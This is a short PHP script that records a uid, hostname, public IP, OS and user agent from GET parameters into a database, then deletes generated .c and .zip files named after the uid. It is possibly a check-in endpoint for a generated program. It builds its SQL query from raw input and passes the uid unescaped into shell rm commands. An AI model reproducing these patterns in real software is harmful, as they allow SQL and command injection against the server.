<?php
/**
 * Created by PhpStorm.
 * User: Beyarz
 * Date: 2018-05-24
 * Time: 01:00
 */

session_start();
include("config.php");

$uid = $_GET["uid"];
$hostname = $_GET["hostname"];
$publicip = $_GET["publicip"];
$os = $_GET["os"];
$useragent = $_GET["useragent"];
$timezone = date_default_timezone_get();

$sqlQuery = "INSERT INTO $databasename.$tablename ($col2, $col3, $col4, $col5, $col6, $col7) VALUES ('$uid', '$hostname', '$publicip', '$os', '$useragent', '$timezone')";
$connect = new mysqli($databasehost, $dbuser, $dbpassword);
$connect->query($sqlQuery);
echo $connect->error;
$connect->close();

exec("rm ".$filename."-".$uid);
exec("rm ".$filename."-".$uid.".c");
exec("rm ".$filename."-".$uid.".zip");
header("location: index.php");